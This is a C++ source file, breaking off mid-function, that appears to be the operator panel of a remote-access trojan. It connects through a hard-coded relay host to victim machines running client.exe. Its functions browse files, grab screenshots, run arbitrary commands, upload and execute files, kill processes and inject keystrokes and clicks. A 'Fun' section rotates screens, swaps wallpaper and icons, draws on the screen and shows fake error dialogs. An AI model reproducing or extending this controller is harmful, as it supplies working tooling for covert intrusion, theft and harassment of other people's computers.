// ═══════════════════════════════════════════════════════════════════
//  SERVER v5 — UX/UI Redesign
//  Design system: 60-30-10 palette, Fitts' law, 3-click rule,
//  WCAG contrast, micro-interactions, modern minimalism
// ═══════════════════════════════════════════════════════════════════
#include <winsock2.h>
#include <ws2tcpip.h>
#include "imgui_setup.h"
#include "wswin.h"
#include "protocol.h"
#include "protection.h"
#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <cstring>
#include <cstdio>
#include <cmath>
#include <cstdlib>
#include <cctype>
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

// ═══════════════════════════════════════════════════════════════════
//  STATE
// ═══════════════════════════════════════════════════════════════════
struct ClientEntry { uint32_t id; std::string name; };
struct FileEntry   { bool isDir; uint64_t size; std::string name; };

static char g_hostBuf[256] = "relay-server-production-eff8.up.railway.app";
static int  g_port = 443;
static ws::SocketT g_sock = ws::INVALID;
static std::atomic<bool> g_connected{false};
static ws::Receiver g_receiver;

static std::mutex g_clientMutex;
static std::vector<ClientEntry> g_clients;
static uint32_t g_selectedClient = 0;

static char g_browsePath[512] = "C:\\";
static std::mutex g_browseMutex;
static std::vector<FileEntry> g_browseResults;
static bool g_browseReady = false, g_browseWait = false;

static std::mutex g_sysMutex;
static std::string g_sysInfo;
static bool g_sysReady = false, g_sysWait = false;

static std::mutex g_screenMutex;
static std::vector<uint8_t> g_screenJpeg;
static bool g_screenReady = false;
static ImTextureID g_screenTexture = 0;
static int g_screenTexW = 0, g_screenTexH = 0;
static bool g_autoRefresh = false;
static float g_refreshInterval = 2.0f;
static float g_refreshTimer = 0.0f;
static bool g_screenWait = false;

static char g_execCmd[512] = "";
static std::mutex g_execMutex;
static std::string g_execOutput;
static bool g_execReady = false, g_execWait = false;

// Process list
struct ProcEntry { uint32_t pid; std::string name; };
static std::mutex g_procMutex;
static std::vector<ProcEntry> g_procList;
static bool g_procReady = false, g_procWait = false;
static char g_procFilter[128] = "";

// Interactive screen
static char g_keyInput[512] = "";
static char g_uploadPath[512] = "";
static char g_runPath[512] = "";

// Draw
static bool g_drawing = false;
static float g_drawR = 1.0f, g_drawG = 0.3f, g_drawB = 0.3f;
static int g_drawSize = 5;
// Local stroke state — used to bridge between ImGui frames so that even
// at low frame rates the ink on the remote screen stays continuous and
// exactly lines up with where the cursor is on the displayed image.
static bool  g_drawStrokeDown = false;    // mouse held while in draw mode
static int   g_drawLastX = -1;
static int   g_drawLastY = -1;
static std::vector<std::pair<int,int>> g_drawLocalPath;  // local preview
static ImU32 g_drawLocalColor = 0;
static int   g_drawLocalSize = 0;

// Message
static char g_msgText[512] = "";
static int g_msgType = 3; // 0=info 1=warning 2=error

// Fun
static int g_screenAngle = 0;
static char g_wallpaperPath[512] = "";
static char g_iconPath[512] = "";

static int g_tab = 0;
static float g_animTime = 0.0f;  // for loading animations

static std::mutex g_logMutex;
static struct { std::string text; ImVec4 color; } g_log[200];
static int g_logCount = 0, g_logHead = 0;
static bool g_logDirty = false;

static ULONG_PTR g_gdiplusToken = 0;

// ═══════════════════════════════════════════════════════════════════
//  DESIGN SYSTEM — 60-30-10 Color Palette
//
//  60% dominant  → deep charcoal backgrounds
//  30% secondary → card surfaces, inputs, panels
//  10% accent   → primary action buttons, active states
// ═══════════════════════════════════════════════════════════════════
namespace DS {
    // ── 60% — Dominant backgrounds ──
    constexpr ImVec4 Bg       (0.043f, 0.043f, 0.051f, 1.0f);  // #0B0B0D
    constexpr ImVec4 BgSide   (0.055f, 0.055f, 0.067f, 1.0f);  // #0E0F11

    // ── 30% — Secondary surfaces ──
    constexpr ImVec4 Card     (0.078f, 0.078f, 0.094f, 1.0f);  // #141418
    constexpr ImVec4 CardHov   (0.098f, 0.098f, 0.118f, 1.0f);  // #19191E
    constexpr ImVec4 Input     (0.063f, 0.063f, 0.078f, 1.0f);  // #101014
    constexpr ImVec4 InputHov   (0.082f, 0.082f, 0.098f, 1.0f);  // #15151A
    constexpr ImVec4 Border     (0.118f, 0.118f, 0.137f, 0.5f);

    // ── 10% — Accent colors ──
    constexpr ImVec4 Accent   (0.298f, 0.557f, 0.890f, 1.0f);  // #4C8DE3
    constexpr ImVec4 AccentHov (0.345f, 0.604f, 0.922f, 1.0f);
    constexpr ImVec4 AccentDim  (0.137f, 0.220f, 0.345f, 1.0f);

    // ── Semantic colors ──
    constexpr ImVec4 Green    (0.275f, 0.722f, 0.451f, 1.0f);
    constexpr ImVec4 GreenBg   (0.137f, 0.345f, 0.220f, 1.0f);
    constexpr ImVec4 Red      (0.804f, 0.290f, 0.314f, 1.0f);
    constexpr ImVec4 RedBg     (0.345f, 0.137f, 0.157f, 1.0f);
    constexpr ImVec4 Yellow   (0.851f, 0.686f, 0.259f, 1.0f);
    constexpr ImVec4 Purple    (0.541f, 0.408f, 0.745f, 1.0f);
    constexpr ImVec4 PurpleBg   (0.220f, 0.161f, 0.314f, 1.0f);
    constexpr ImVec4 Orange    (0.843f, 0.502f, 0.224f, 1.0f);
    constexpr ImVec4 OrangeBg  (0.314f, 0.180f, 0.094f, 1.0f);

    // ── Text ──
    constexpr ImVec4 T1       (0.933f, 0.937f, 0.945f, 1.0f);  // primary
    constexpr ImVec4 T2       (0.580f, 0.588f, 0.627f, 1.0f);  // secondary
    constexpr ImVec4 T3       (0.392f, 0.400f, 0.439f, 1.0f);  // tertiary/labels
}

// ═══════════════════════════════════════════════════════════════════
//  STYLE — Modern minimalism with airy spacing
// ═══════════════════════════════════════════════════════════════════
static void applyStyle() {
    ImGuiStyle& s = ImGui::GetStyle();
    s.WindowRounding = 0;
    s.ChildRounding = 10;
    s.PopupRounding = 10;
    s.FrameRounding = 8;
    s.ScrollbarRounding = 8;
    s.GrabRounding = 6;
    s.TabRounding = 8;
    s.WindowBorderSize = 0;
    s.ChildBorderSize = 0;
    s.FrameBorderSize = 0;
    s.WindowPadding = ImVec2(0, 0);
    s.FramePadding = ImVec2(14, 9);
    s.ItemSpacing = ImVec2(8, 8);
    s.ItemInnerSpacing = ImVec2(8, 4);
    s.ScrollbarSize = 6;
    s.GrabMinSize = 20;

    ImVec4* c = s.Colors;
    c[ImGuiCol_WindowBg]     = DS::Bg;
    c[ImGuiCol_ChildBg]      = DS::Card;
    c[ImGuiCol_PopupBg]      = ImVec4(0.06f, 0.06f, 0.08f, 0.98f);
    c[ImGuiCol_Text]         = DS::T1;
    c[ImGuiCol_TextDisabled] = DS::T2;
    c[ImGuiCol_FrameBg]      = DS::Input;
    c[ImGuiCol_FrameBgHovered] = DS::InputHov;
    c[ImGuiCol_FrameBgActive]  = DS::InputHov;
    c[ImGuiCol_Button]       = DS::Card;
    c[ImGuiCol_ButtonHovered] = DS::CardHov;
    c[ImGuiCol_ButtonActive]  = DS::AccentDim;
    c[ImGuiCol_Header]       = ImVec4(0, 0, 0, 0);
    c[ImGuiCol_HeaderHovered] = DS::CardHov;
    c[ImGuiCol_HeaderActive]  = DS::AccentDim;
    c[ImGuiCol_CheckMark]     = DS::Accent;
    c[ImGuiCol_SliderGrab]    = DS::Accent;
    c[ImGuiCol_SliderGrabActive] = DS::AccentHov;
    c[ImGuiCol_ScrollbarBg]   = ImVec4(0, 0, 0, 0);
    c[ImGuiCol_ScrollbarGrab] = DS::CardHov;
    c[ImGuiCol_ScrollbarGrabHovered] = DS::AccentDim;
    c[ImGuiCol_ScrollbarGrabActive]  = DS::Accent;
    c[ImGuiCol_Separator]     = DS::Border;
}

// ═══════════════════════════════════════════════════════════════════
//  UI PRIMITIVES — Reusable design system components
// ═══════════════════════════════════════════════════════════════════

// Rounded filled rect via draw list
static void fillRounded(ImDrawList* dl, ImVec2 p0, ImVec2 p1, ImU32 col, float r = 8) {
    dl->AddRectFilled(p0, p1, col, r);
}

// Primary CTA button — solid accent, large touch target (Fitts' law)
static bool ctaBtn(const char* label, const ImVec4& col, ImVec2 sz = ImVec2(0, 38)) {
    ImGui::PushStyleColor(ImGuiCol_Button, col);
    ImGui::PushStyleColor(ImGuiCol_ButtonHovered,
        ImVec4(col.x + 0.05f, col.y + 0.05f, col.z + 0.05f, 1));
    ImGui::PushStyleColor(ImGuiCol_ButtonActive,
        ImVec4(col.x - 0.03f, col.y - 0.03f, col.z - 0.03f, 1));
    ImGui::PushStyleColor(ImGuiCol_Text, DS::T1);
    bool r = ImGui::Button(label, sz);
    ImGui::PopStyleColor(4);
    return r;
}

// Secondary button — subtle, for non-primary actions
static bool ghostBtn(const char* label, ImVec2 sz = ImVec2(0, 38)) {
    ImGui::PushStyleColor(ImGuiCol_Text, DS::T2);
    bool r = ImGui::Button(label, sz);
    ImGui::PopStyleColor();
    return r;
}

// Pill-shaped nav tab
static bool navPill(const char* label, bool active, const ImVec4& accent) {
    auto* dl = ImGui::GetWindowDrawList();
    ImVec2 p0 = ImGui::GetCursorScreenPos();
    ImVec2 ts = ImGui::CalcTextSize(label);
    float pad = 16;
    ImVec2 btnSz(ts.x + pad * 2, 34);

    if (active) {
        fillRounded(dl, p0, ImVec2(p0.x + btnSz.x, p0.y + btnSz.y),
            ImGui::ColorConvertFloat4ToU32(accent), 8);
    }

    ImGui::SetCursorScreenPos(ImVec2(p0.x + pad, p0.y + (btnSz.y - ts.y) * 0.5f));
    ImGui::PushStyleColor(ImGuiCol_Text, active ? DS::T1 : DS::T2);
    ImGui::TextUnformatted(label);
    ImGui::PopStyleColor();

    ImGui::SetCursorScreenPos(p0);
    ImGui::Dummy(btnSz);

    bool clicked = ImGui::IsItemHovered() && ImGui::IsMouseClicked(0);
    return clicked;
}

// Section label — small uppercase header
static void label(const char* text) {
    ImGui::Dummy(ImVec2(0, 4));
    ImGui::TextColored(DS::T3, "%s", text);
    ImGui::Dummy(ImVec2(0, 4));
}

// Animated loading dots
static void loadingDots(float w) {
    const char* dots[4] = {".", "..", "...", ""};
    int phase = (int)(g_animTime * 3.0f) % 4;
    const char* t = dots[phase];
    char buf[64]; snprintf(buf, sizeof(buf), "Loading%s", t);
    ImVec2 ts = ImGui::CalcTextSize(buf);
    ImGui::SetCursorPosX((w - ts.x) * 0.5f);
    ImGui::TextColored(DS::T2, "%s", buf);
}

// Empty state — centered icon-less placeholder
static void emptyState(const char* title, const char* subtitle, float w) {
    ImGui::Dummy(ImVec2(0, 50));
    ImVec2 ts = ImGui::CalcTextSize(title);
    ImGui::SetCursorPosX((w - ts.x) * 0.5f);
    ImGui::TextColored(DS::T2, "%s", title);
    if (subtitle) {
        ImVec2 ss = ImGui::CalcTextSize(subtitle);
        ImGui::SetCursorPosX((w - ss.x) * 0.5f);
        ImGui::TextColored(DS::T3, "%s", subtitle);
    }
}

// ═══════════════════════════════════════════════════════════════════
//  NETWORKING (unchanged)
// ═══════════════════════════════════════════════════════════════════
static ImVec4 logColorFor(const std::string& l) {
    if (l.size() < 2) return DS::T2;
    char c = l[1];
    if (c == '+') return DS::Green;
    if (c == '!') return DS::Red;
    if (c == '>') return DS::Accent;
    if (c == '<') return ImVec4(0.4f, 0.7f, 0.9f, 1);
    if (c == '*') return DS::Yellow;
    return DS::T2;
}

static void addLog(const char* fmt, ...) {
    char buf[512]; va_list a; va_start(a, fmt);
    vsnprintf(buf, sizeof(buf), fmt, a); va_end(a);
    std::lock_guard<std::mutex> lk(g_logMutex);
    g_log[g_logHead].text = buf;
    g_log[g_logHead].color = logColorFor(buf);
    g_logHead = (g_logHead + 1) % 200;
    if (g_logCount < 200) g_logCount++;
    g_logDirty = true;
}

static std::string formatSize(uint64_t sz) {
    char b[32];
    if (sz < 1024ull)            snprintf(b, sizeof(b), "%llu B",  (unsigned long long)sz);
    else if (sz < 1048576ull)    snprintf(b, sizeof(b), "%.1f KB", sz / 1024.0);
    else if (sz < 1073741824ull) snprintf(b, sizeof(b), "%.1f MB", sz / 1048576.0);
    else                         snprintf(b, sizeof(b), "%.1f GB", sz / 1073741824.0);
    return b;
}

static void sendCommand(uint8_t ct, const std::vector<uint8_t>& pl) {
    if (!g_connected || g_selectedClient == 0) return;
    proto::Writer w; w.u32(g_selectedClient);
    w.raw(pl.data(), pl.size());
    auto m = proto::buildMessage(proto::MSG_COMMAND, ct, w.bytes());
    ws::sendAllAsync(g_sock, m.data(), m.size());
}
static bool canSend() {
    if (!g_connected) { addLog("[!] Not connected"); return false; }
    if (g_selectedClient == 0) { addLog("[!] No client selected"); return false; }
    return true;
}
static bool decodeJpeg(const uint8_t* j, size_t n, std::vector<uint8_t>& rgba, int& w, int& h) {
    IStream* s = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &s) != S_OK || !s) return false;
    s->Write(j, (ULONG)n, nullptr);
    LARGE_INTEGER z = {}; s->Seek(z, STREAM_SEEK_SET, nullptr);
    Gdiplus::Bitmap b(s);
    if (b.GetLastStatus() != Gdiplus::Ok) { s->Release(); return false; }
    w = b.GetWidth(); h = b.GetHeight();
    Gdiplus::Rect r(0,0,w,h); Gdiplus::BitmapData d;
    if (b.LockBits(&r, Gdiplus::ImageLockModeRead, PixelFormat32bppARGB, &d) != Gdiplus::Ok) { s->Release(); return false; }
    rgba.resize((size_t)w*h*4);
    auto* src = (uint8_t*)d.Scan0;
    for (int y=0; y<h; y++) for (int x=0; x<w; x++) {
        uint8_t* p = src + y*d.Stride + x*4;
        uint8_t* o = &rgba[(y*w+x)*4];
        o[0]=p[2]; o[1]=p[1]; o[2]=p[0]; o[3]=255;
    }
    b.UnlockBits(&d); s->Release();
    return true;
}
static void onMessage(uint8_t mt, uint8_t ct, std::vector<uint8_t> pl) {
    if (mt == proto::MSG_DISCONNECT) { g_connected = false; addLog("[!] Disconnected"); return; }
    if (mt == proto::MSG_CLIENT_LIST) {
        std::lock_guard<std::mutex> lk(g_clientMutex);
        g_clients.clear();
        proto::Reader r(pl.data(), pl.size()); uint32_t n;
        if (r.u32(n)) for (uint32_t i=0;i<n;i++) { uint32_t id; std::string nm;
            if (r.u32(id) && r.str(nm)) g_clients.push_back({id, std::move(nm)}); }
        addLog("[*] %u clients online", (unsigned)g_clients.size());
        bool f=false; for (auto& c : g_clients) if (c.id==g_selectedClient) {f=true;break;}
        if (!f) g_selectedClient = 0;
        return;
    }
    if (mt != proto::MSG_RESPONSE || pl.size() < 4) return;
    uint32_t src; memcpy(&src, pl.data(), 4);
    std::vector<uint8_t> resp(pl.begin()+4, pl.end());
    if (ct == proto::CMD_BROWSE_FILES) {
        std::lock_guard<std::mutex> lk(g_browseMutex);
        g_browseResults.clear();
        proto::Reader r(resp.data(), resp.size()); uint32_t n;
        if (r.u32(n)) for (uint32_t i=0;i<n;i++) { uint8_t d; uint64_t sz; std::string nm;
            if (r.u8(d) && r.u64(sz) && r.str(nm)) g_browseResults.push_back({d!=0, sz, std::move(nm)}); }
        g_browseReady=true; g_browseWait=false;
        addLog("[<] %u files", (unsigned)g_browseResults.size());
    } else if (ct == proto::CMD_SYSTEM_INFO) {
        std::lock_guard<std::mutex> lk(g_sysMutex);
        g_sysInfo.clear(); proto::Reader r(resp.data(), resp.size()); r.str(g_sysInfo);
        g_sysReady=true; g_sysWait=false; addLog("[<] SysInfo received");
    } else if (ct == proto::CMD_VIEW_SCREEN) {
        std::lock_guard<std::mutex> lk(g_screenMutex);
        g_screenJpeg = resp; g_screenReady=true; g_screenWait=false;
        addLog("[<] Screen: %u bytes", (unsigned)resp.size());
    } else if (ct == proto::CMD_EXECUTE) {
        std::lock_guard<std::mutex> lk(g_execMutex);
        g_execOutput.clear(); proto::Reader r(resp.data(), resp.size()); r.str(g_execOutput);
        g_execReady=true; g_execWait=false; addLog("[<] Exec output received");
    }
    else if (ct == proto::CMD_MOUSE_CLICK) {
        std::string r; { proto::Reader rd(resp.data(), resp.size()); rd.str(r); }
        addLog("[<] Click result: %s", r.c_str());
    }
    else if (ct == proto::CMD_KEY_INPUT) {
        std::string r; { proto::Reader rd(resp.data(), resp.size()); rd.str(r); }
        addLog("[<] Key input: %s", r.c_str());
    }
    else if (ct == proto::CMD_FILE_UPLOAD) {
        std::string r; { proto::Reader rd(resp.data(), resp.size()); rd.str(r); }
        addLog("[<] File saved: %s", r.c_str());
    }
    else if (ct == proto::CMD_RUN_FILE) {
        std::string r; { proto::Reader rd(resp.data(), resp.size()); rd.str(r); }
        addLog("[<] Run result: %s", r.c_str());
    }
    else if (ct == proto::CMD_PROCESS_LIST) {
        std::lock_guard<std::mutex> lk(g_procMutex);
        g_procList.clear();
        proto::Reader r(resp.data(), resp.size());
        uint32_t n;
        if (r.u32(n))
            for (uint32_t i = 0; i < n; i++) {
                uint32_t pid; std::string nm;
                if (r.u32(pid) && r.str(nm))
                    g_procList.push_back({pid, std::move(nm)});
            }
        g_procReady = true; g_procWait = false;
        addLog("[<] Processes: %u", (unsigned)g_procList.size());
    }
    else if (ct == proto::CMD_KILL_PROCESS) {
        std::string r; { proto::Reader rd(resp.data(), resp.size()); rd.str(r); }
        addLog("[<] Kill: %s", r.c_str());
    }
}
static std::atomic<bool> g_connecting{false};

static void doConnect() {
    if (g_connecting) return;
    g_connecting = true;

    if (g_sock != ws::INVALID) { g_receiver.stop(); ws::close(g_sock); g_sock = ws::INVALID; }
    g_connected = false;
    addLog("[*] Connecting to %s:%d ...", g_hostBuf, g_port);

    std::thread([]() {
        std::string regPayload;
        regPayload.push_back((char)proto::ROLE_SERVER);
        g_sock = ws::connect(std::string(g_hostBuf), g_port, regPayload);
        if (g_sock == ws::INVALID) {
            addLog("[!] Connect failed: %s", ws::lastError().c_str());
            g_connecting = false;
            return;
        }
        g_connected = true;
        g_connecting = false;
        g_receiver.start(g_sock, onMessage);
        ws::startAsyncSend(g_sock);
        addLog("[+] Connected: %s:%d", g_hostBuf, g_port);
    }).detach();
}
static void doDisconnect() {
    ws::stopAsyncSend();
    g_receiver.stop(); ws::close(g_sock); g_sock = ws::INVALID; g_connected = false;
    std::lock_guard<std::mutex> lk(g_clientMutex);
    g_clients.clear(); g_selectedClient = 0;
    addLog("[*] Disconnected");
}
static void sendBrowseFiles() {
    if (!canSend()) return;
    proto::Writer w; w.str(std::string(g_browsePath));
    sendCommand(proto::CMD_BROWSE_FILES, w.bytes());
    g_browseWait=true; g_browseReady=false;
    addLog("[>] Browse: %s", g_browsePath);
}
static void sendSystemInfo() {
    if (!canSend()) return;
    sendCommand(proto::CMD_SYSTEM_INFO, {});
    g_sysWait=true; g_sysReady=false;
    addLog("[>] SysInfo requested");
}
static void sendViewScreen() {
    if (!canSend()) return;
    sendCommand(proto::CMD_VIEW_SCREEN, {});
    g_screenWait=true;
    addLog("[>] Screen requested");
}
static void sendExecute() {
    if (strlen(g_execCmd) == 0) return;
    if (!canSend()) return;
    proto::Writer w; w.str(std::string(g_execCmd));
    sendCommand(proto::CMD_EXECUTE, w.bytes());
    g_execWait=true; g_execReady=false;
    addLog("[>] Exec: %s", g_execCmd);
}

// ── New send functions ─────────────────────────────────────────────
static void sendMouseClick(int x, int y, int button) {
    if (!canSend()) return;
    proto::Writer w;
    w.u32((uint32_t)x);
    w.u32((uint32_t)y);
    w.u8((uint8_t)button);
    sendCommand(proto::CMD_MOUSE_CLICK, w.bytes());
    addLog("[>] Click: %d,%d btn=%d", x, y, button);
}
static void sendKeyInput(const std::string& text) {
    if (text.empty() || !canSend()) return;
    proto::Writer w;
    w.str(text);
    sendCommand(proto::CMD_KEY_INPUT, w.bytes());
    addLog("[>] Keys: %zu chars", text.size());
}
static void sendFileUpload(const std::string& localPath) {
    if (!canSend()) return;
    FILE* f = nullptr;
    fopen_s(&f, localPath.c_str(), "rb");
    if (!f) { addLog("[!] Cannot open: %s", localPath.c_str()); return; }
    fseek(f, 0, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    std::vector<uint8_t> data(sz);
    fread(data.data(), 1, sz, f);
    fclose(f);

    // Extract filename from path
    size_t pos = localPath.find_last_of("\\/");
    std::string filename = (pos != std::string::npos) ? localPath.substr(pos + 1) : localPath;

    proto::Writer w;
    w.str(filename);
    w.raw(data.data(), sz);
    sendCommand(proto::CMD_FILE_UPLOAD, w.bytes());
    addLog("[>] Upload: %s (%zu bytes)", filename.c_str(), sz);
}
static void sendRunFile(const std::string& path) {
    if (path.empty() || !canSend()) return;
    proto::Writer w;
    w.str(path);
    sendCommand(proto::CMD_RUN_FILE, w.bytes());
    addLog("[>] Run: %s", path.c_str());
}
static void sendProcessList() {
    if (!canSend()) return;
    sendCommand(proto::CMD_PROCESS_LIST, {});
    g_procWait = true; g_procReady = false;
    addLog("[>] Process list requested");
}
static void sendKillProcess(uint32_t pid) {
    if (!canSend()) return;
    proto::Writer w;
    w.u32(pid);
    sendCommand(proto::CMD_KILL_PROCESS, w.bytes());
    addLog("[>] Kill: PID %u", pid);
}

static void sendDraw(uint8_t dtype, int x, int y, uint8_t r, uint8_t g, uint8_t b, int size) {
    if (!canSend()) return;
    proto::Writer w;
    w.u8(dtype);
    w.u32((uint32_t)x);
    w.u32((uint32_t)y);
    w.u8(r);
    w.u8(g);
    w.u8(b);
    w.u32((uint32_t)size);
    sendCommand(proto::CMD_DRAW, w.bytes());
}

// Resets local + remote stroke state. We deliberately keep g_drawing = true;
// the user expects the pen to remain armed between strokes.
static void sendClearDraw() {
    if (!canSend()) return;
    proto::Writer w;
    w.u8(1); // clear
    w.u32(0); w.u32(0); w.u8(0); w.u8(0); w.u8(0); w.u32(0);
    sendCommand(proto::CMD_DRAW, w.bytes());
    g_drawStrokeDown = false;
    g_drawLastX = g_drawLastY = -1;
    g_drawLocalPath.clear();
    addLog("[>] Draw: cleared");
}

static void sendRotateScreen(uint8_t angle) {
    if (!canSend()) return;
    proto::Writer w;
    w.u8(angle);
    sendCommand(proto::CMD_ROTATE_SCREEN, w.bytes());
    addLog("[>] Rotate screen: %u degrees", (unsigned)angle);
}

static void sendMessage() {
    if (strlen(g_msgText) == 0 || !canSend()) return;
    proto::Writer w;
    w.u8((uint8_t)g_msgType);
    w.str(std::string(g_msgText));
    sendCommand(proto::CMD_MESSAGE, w.bytes());
    const char* tname = g_msgType == 2 ? "Error" : (g_msgType == 1 ? "Warning" : "Info");
    addLog("[>] %s: %s", tname, g_msgText);
}

static void sendRotateScreen(int angle) {
    if (!canSend()) return;
    proto::Writer w;
    w.u32((uint32_t)angle);
    sendCommand(proto::CMD_ROTATE_SCREEN, w.bytes());
    addLog("[>] Rotate screen: %d degrees", angle);
}

static void sendSetWallpaper(const std::string& localPath) {
    if (!canSend()) return;
    FILE* f = nullptr;
    fopen_s(&f, localPath.c_str(), "rb");
    if (!f) { addLog("[!] Cannot open: %s", localPath.c_str()); return; }
    fseek(f, 0, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    std::vector<uint8_t> data(sz);
    fread(data.data(), 1, sz, f);
    fclose(f);

    proto::Writer w;
    w.u32((uint32_t)sz);
    w.raw(data.data(), sz);
    sendCommand(proto::CMD_SET_WALLPAPER, w.bytes());
    addLog("[>] Wallpaper: %s (%zu bytes)", localPath.c_str(), sz);
}

static void sendReplaceIcons(const std::string& iconPath) {
    if (!canSend()) return;
    proto::Writer w;
    w.str(iconPath);
    sendCommand(proto::CMD_REPLACE_ICONS, w.bytes());
    addLog("[>] Replace icons: %s", iconPath.c_str());
}

static void sendKickClient(uint32_t clientId) {
    if (!g_connected) return;
    proto::Writer w;
    w.u32(clientId);
    auto m = proto::buildMessage(proto::MSG_KICK_CLIENT, 0, w.bytes());
    ws::sendAllAsync(g_sock, m.data(), m.size());
    addLog("[!] Kick client: #%u", clientId);
}

// ═══════════════════════════════════════════════════════════════════
//  SIDEBAR — Connection status + Client list
// ═══════════════════════════════════════════════════════════════════
static void drawSidebar(float w) {
    auto* dl = ImGui::GetWindowDrawList();
    ImGui::BeginChild("##side", ImVec2(w, 0));

    // ── Brand header ──
    {
        ImVec2 p = ImGui::GetCursorScreenPos();
        ImGui::Dummy(ImVec2(0, 8));
        ImGui::SetCursorPosX(18);
        ImGui::TextColored(DS::T1, "REMOTE"); ImGui::SameLine(0, 0);
        ImGui::TextColored(DS::Accent, " CONTROL");
        ImGui::SetCursorPosX(18);
        ImGui::TextColored(DS::T3, "Server Panel");
        ImGui::Dummy(ImVec2(0, 8));
    }

    // ── Connection card ──
    {
        ImGui::Dummy(ImVec2(0, 4));
        ImVec2 cp = ImGui::GetCursorScreenPos();
        float ch = g_connected ? 72.0f : 120.0f;
        // Card background
        dl->AddRectFilled(ImVec2(cp.x + 12, cp.y), ImVec2(cp.x + w - 12, cp.y + ch),
            ImGui::ColorConvertFloat4ToU32(DS::Card), 10);
        ImGui::SetCursorScreenPos(ImVec2(cp.x + 22, cp.y + 14));

        if (g_connecting) {
            // Connecting state
            dl->AddCircleFilled(ImVec2(cp.x + 26, cp.y + 22), 5,
                ImGui::ColorConvertFloat4ToU32(DS::Yellow));
            ImGui::SetCursorPosX(40);
            ImGui::TextColored(DS::Yellow, "Connecting...");
            ImGui::SetCursorPosX(22);
            ImGui::TextColored(DS::T3, "%s:%d", g_hostBuf, g_port);
            ImGui::Dummy(ImVec2(0, 4));
            ImGui::SetCursorPosX(22);
            if (ghostBtn("Cancel", ImVec2(w - 44, 28))) g_connecting = false;
        } else if (!g_connected) {
            ImGui::TextColored(DS::T3, "RELAY");
            ImGui::Dummy(ImVec2(0, 6));
            ImGui::SetCursorPosX(22); ImGui::PushItemWidth(w - 44);
            ImGui::InputTextWithHint("##h", "Host / IP", g_hostBuf, sizeof(g_hostBuf));
            ImGui::SetCursorPosX(22); ImGui::InputInt("##p", &g_port);
            ImGui::PopItemWidth();
            ImGui::Dummy(ImVec2(0, 6));
            ImGui::SetCursorPosX(22);
            if (ctaBtn("Connect", DS::Green, ImVec2(w - 44, 34))) doConnect();
        } else {
            // Green status dot
            dl->AddCircleFilled(ImVec2(cp.x + 26, cp.y + 22), 5,
                ImGui::ColorConvertFloat4ToU32(DS::Green));
            ImGui::SetCursorPosX(40);
            ImGui::TextColored(DS::Green, "Connected");
            ImGui::SetCursorPosX(22);
            ImGui::TextColored(DS::T2, "%s:%d", g_hostBuf, g_port);
            ImGui::Dummy(ImVec2(0, 4));
            ImGui::SetCursorPosX(22);
            if (ghostBtn("Disconnect", ImVec2(w - 44, 28))) doDisconnect();
        }
        ImGui::Dummy(ImVec2(0, ch - ImGui::GetCursorPosY() + cp.y + 4));
    }

    // ── Clients section ──
    ImGui::Dummy(ImVec2(0, 8));
    {
        int n = 0;
        { std::lock_guard<std::mutex> lk(g_clientMutex); n = (int)g_clients.size(); }
        ImGui::SetCursorPosX(22);
        ImGui::TextColored(DS::T3, "CLIENTS");
        ImGui::SameLine(w - 30);
        ImGui::TextColored(DS::T3, "%d", n);
    }
    ImGui::Dummy(ImVec2(0, 4));

    {
        std::lock_guard<std::mutex> lk(g_clientMutex);
        if (g_clients.empty()) {
            ImGui::SetCursorPosX(22);
            ImGui::TextColored(DS::T3, "No clients online");
            ImGui::SetCursorPosX(22);
            ImGui::TextColored(DS::T3, "Launch client.exe");
        }
        for (auto& c : g_clients) {
            bool sel = (c.id == g_selectedClient);
            ImGui::PushID(c.id);
            ImVec2 p = ImGui::GetCursorScreenPos();
            float h = 48;

            // Card
            ImU32 bg = sel ? ImGui::ColorConvertFloat4ToU32(DS::AccentDim) : ImGui::ColorConvertFloat4ToU32(DS::Card);
            dl->AddRectFilled(ImVec2(p.x + 12, p.y), ImVec2(p.x + w - 12, p.y + h), bg, 10);

            // Left accent bar
            if (sel)
                dl->AddRectFilled(ImVec2(p.x + 12, p.y), ImVec2(p.x + 15, p.y + h),
                    ImGui::ColorConvertFloat4ToU32(DS::Accent), 4);

            // Status dot
            dl->AddCircleFilled(ImVec2(p.x + 28, p.y + h * 0.5f), 4,
                ImGui::ColorConvertFloat4ToU32(sel ? DS::Green : DS::T3));

            // Name + ID
            ImGui::SetCursorScreenPos(ImVec2(p.x + 40, p.y + 8));
            ImGui::TextColored(sel ? DS::T1 : DS::T2, "%s", c.name.c_str());
            ImGui::SetCursorScreenPos(ImVec2(p.x + 40, p.y + 26));
            ImGui::TextColored(DS::T3, "#%u", c.id);

            // Click target
            ImGui::SetCursorScreenPos(ImVec2(p.x + 12, p.y));
            ImGui::InvisibleButton("##c", ImVec2(w - 24, h));
            if (ImGui::IsItemClicked()) {
                g_selectedClient = c.id;
                addLog("[*] Target: %s (#%u)", c.name.c_str(), c.id);
            }
            if (ImGui::IsItemClicked(1)) {
                // Right-click → context menu
                ImGui::OpenPopup(("ctx" + std::to_string(c.id)).c_str());
            }
            if (ImGui::BeginPopup(("ctx" + std::to_string(c.id)).c_str())) {
                if (ImGui::Selectable("Disconnect")) sendKickClient(c.id);
                ImGui::EndPopup();
            }
            ImGui::Dummy(ImVec2(0, 4));
            ImGui::PopID();
        }
    }

    // ── Disconnect button for currently selected client ──
    ImGui::Dummy(ImVec2(0, 6));
    ImGui::SetCursorPosX(14);
    if (g_selectedClient != 0) {
        if (ghostBtn("  Disconnect Client", ImVec2(w - 28, 30)))
            sendKickClient(g_selectedClient);
    }
    ImGui::Dummy(ImVec2(0, 24));

    ImGui::EndChild();
}

// ═══════════════════════════════════════════════════════════════════
//  NAV BAR — Pill tabs + target info
// ═══════════════════════════════════════════════════════════════════
static void drawNav(float w) {
    auto* dl = ImGui::GetWindowDrawList();
    ImVec2 p0 = ImGui::GetCursorScreenPos();
    float h = 56;
    dl->AddRectFilled(p0, ImVec2(p0.x + w, p0.y + h), ImGui::ColorConvertFloat4ToU32(DS::BgSide));
    dl->AddLine(ImVec2(p0.x, p0.y + h), ImVec2(p0.x + w, p0.y + h),
        ImGui::ColorConvertFloat4ToU32(DS::Border));

    // Tabs
